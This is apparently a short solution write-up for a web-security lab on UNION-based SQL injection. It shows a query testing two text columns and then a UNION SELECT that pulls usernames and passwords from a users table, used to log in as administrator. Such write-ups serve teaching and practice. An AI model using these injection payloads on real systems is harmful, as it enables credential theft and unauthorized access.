Solution:

Here, The database contains a different table called users, with columns called username and password.


``` SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' --  ```

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method. 

``` SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users -- ```

Now, We have the credentials of username and password and with that we can access it as administrator.
